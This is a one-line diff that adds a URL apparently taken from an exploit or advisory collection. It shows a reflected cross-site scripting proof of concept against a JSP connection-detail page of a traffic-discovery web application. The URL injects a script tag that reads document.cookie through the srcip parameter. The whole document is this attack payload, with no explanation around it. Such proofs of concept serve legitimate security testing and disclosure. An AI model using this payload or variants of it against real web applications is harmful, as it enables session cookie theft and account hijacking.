@@ -1,0 +1,1 @@
+http://www.example.com/corporate/webpages/trafficdiscovery/LiveConnectionDetail.jsp?srcip=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
